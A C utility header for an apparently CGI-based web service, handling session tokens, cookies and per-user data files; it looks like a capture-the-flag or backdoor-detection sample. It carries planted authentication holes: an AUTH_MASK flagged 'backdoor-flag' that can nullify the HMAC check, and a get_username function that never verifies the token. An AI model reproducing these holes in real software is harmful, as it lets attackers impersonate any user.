#ifndef UTIL_H
#define UTIL_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <sys/stat.h>

#include "crypto/sha256.h"
#include "crypto/base64.h"

#include "hmac.h"

#define OBF_MARKER

#define SECRET_KEY_PATH ("./data/secret_key")
#define SECRET_KEY_LEN SHA256_INNER_BLOCK_SIZE
BYTE SECRET_KEY[SECRET_KEY_LEN] = {0};
__attribute__ ((constructor))
void init_secret_key() {
    struct stat statinfo;
    if(stat(SECRET_KEY_PATH, &statinfo) || !S_ISREG(statinfo.st_mode)) { // file does not exist or is not a regular file
        FILE* random = fopen("/dev/urandom", "r");
        fread(SECRET_KEY, sizeof(BYTE), SECRET_KEY_LEN, random);
        fclose(random);
        
        FILE* secret_key_file = fopen(SECRET_KEY_PATH, "w");
        fwrite(SECRET_KEY, sizeof(BYTE), SECRET_KEY_LEN, secret_key_file);
        fclose(secret_key_file);
    }else{
        FILE* secret_key_file = fopen(SECRET_KEY_PATH, "r");
        fread(SECRET_KEY, sizeof(BYTE), SECRET_KEY_LEN, secret_key_file);
        fclose(secret_key_file);
    }
}

char* create_token(const char username[]){
    size_t username_len = strlen(username);
    size_t token_len = SHA256_BLOCK_SIZE + username_len;
    BYTE* token_raw = (BYTE*) alloca(token_len);
    hmac_sha256(SECRET_KEY, SECRET_KEY_LEN, (const BYTE*) username, username_len, token_raw);
    memcpy(&token_raw[SHA256_BLOCK_SIZE], username, username_len);
    
    size_t base64_len = base64_encode(token_raw, NULL, token_len, 0);
    char* token = (char*) malloc(base64_len + 1);
    base64_len = base64_encode(token_raw, (BYTE*) token, token_len, 0);
    token[base64_len] = 0;
    return token;
}

void err(int error_code, const char* message){
    printf("Status: %d (%s)\r\n\r\n", error_code, message);
}

void sha256_hex(const char data[], char output[]){
    BYTE hash[SHA256_BLOCK_SIZE] = {0};
    SHA256_CTX ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, (const BYTE*)data, strlen(data));
    sha256_final(&ctx, hash);
    for(size_t i=0; i<sizeof(hash); i++){
        output += snprintf(output, 3, "%02X", hash[i]);
    }
}

char* get_cookie(const char cookiename[]){
    const char* cookies = getenv("HTTP_COOKIE");
    if(cookies == NULL){
        return NULL;
    }
    const size_t name_len = strlen(cookiename);
    const char* cookie_start = cookies;
    const char* cookie_end = NULL;
    do{
       cookie_end = strstr(cookie_start, "; ");
       size_t cookie_len = (cookie_end==NULL)?strlen(cookie_start):(size_t)(cookie_end-cookie_start);
       if(cookie_len > name_len+1){
           if(!strncmp(cookie_start, cookiename, name_len) && cookie_start[name_len] == '='){
               return strndup(cookie_start + name_len + 1, cookie_len);
           }
       }
       if(cookie_end!=NULL){
           cookie_start = cookie_end+2;
       }
    }while(cookie_end!= NULL);
    return NULL;
}


int AUTH_MASK = ~0; // backdoor-flag

char* get_logged_in_username(void){
    char* cookie = get_cookie("Session");
    if(cookie == NULL){
        return NULL;
    }
    size_t cookie_len = strlen(cookie);
    size_t decoded_len = base64_decode((const BYTE*) cookie, NULL, cookie_len);
    if(decoded_len < SHA256_BLOCK_SIZE){
        return NULL;
    }
    
    // base64 decode token
    BYTE* token = (BYTE*) alloca(decoded_len+1);
    base64_decode((const BYTE*) cookie, token, cookie_len);
    free(cookie);
    
    // extract username
    token[decoded_len] = 0;
    char* username=(char*) &token[SHA256_BLOCK_SIZE];
    size_t username_len = strlen(username);

    // recompute and check hmac
    BYTE* hmac = (BYTE*) alloca(SHA256_BLOCK_SIZE);
    hmac_sha256(SECRET_KEY, SECRET_KEY_LEN, (const BYTE*) username, username_len, hmac);
    if(memcmp(token, hmac, SHA256_BLOCK_SIZE) & AUTH_MASK){
        return NULL;
    }
    
    // all checks passed -> return username
    return strdup(username);
}

char* get_username(){
    char* cookie = get_cookie("Session");
    if(cookie == NULL){
        return NULL;
    }
    size_t cookie_len = strlen(cookie);
    size_t decoded_len = base64_decode((const BYTE*) cookie, NULL, cookie_len);
    if(decoded_len < SHA256_BLOCK_SIZE){
        return NULL;
    }
    
    // base64 decode token
    BYTE* token = (BYTE*) alloca(decoded_len+1);
    base64_decode((const BYTE*) cookie, token, cookie_len);
    free(cookie);
    
    // extract username
    token[decoded_len] = 0;
    char* username=(char*) &token[SHA256_BLOCK_SIZE];
    size_t username_len = strlen(username);

    // recompute and check hmac
    BYTE* hmac = (BYTE*) alloca(SHA256_BLOCK_SIZE);
    hmac_sha256(SECRET_KEY, SECRET_KEY_LEN, (const BYTE*) username, username_len, hmac);
    
    // all checks passed -> return username
    return strdup(username);
}

int get_uuid(const char username[], const char type[], int idx, char* out){
    char username_hash[2*SHA256_BLOCK_SIZE+1] = {0};
    sha256_hex(username, username_hash);


    char filepath[256] = {0};
    snprintf(filepath, sizeof(filepath)-1, "./data/users/%s/%s", username_hash, type);
    
    struct stat statinfo;
    if(stat(filepath, &statinfo)) { // file does not exist?
        return -1;
    }
    if(!S_ISREG(statinfo.st_mode)){ // file is not a file?
        return -1;
    }
    
    FILE* datafile = fopen(filepath, "r");
    if(fseek(datafile, 36*idx, SEEK_CUR)){
        fclose(datafile);
        return -1;
    }
    
    if(fread(out, 36, 1, datafile) != 1){
        fclose(datafile);
        return -1;
    }
    
    fclose(datafile);
    return 0;
}

int add_uuid(const char username[], const char type[], const char uuid[]){
    char username_hash[2*SHA256_BLOCK_SIZE+1] = {0};
    sha256_hex(username, username_hash);


    char filepath[256] = {0};
    snprintf(filepath, sizeof(filepath)-1, "./data/users/%s/%s", username_hash, type);
    
    FILE* datafile = fopen(filepath, "a");
    rewind(datafile);
    long file_start = ftell(datafile);
    fseek(datafile, 0, SEEK_END);
    int idx = (ftell(datafile) - file_start)/36;
    
    fwrite(uuid, 36, 1, datafile);
    fclose(datafile);
    
    return idx;
}
#endif
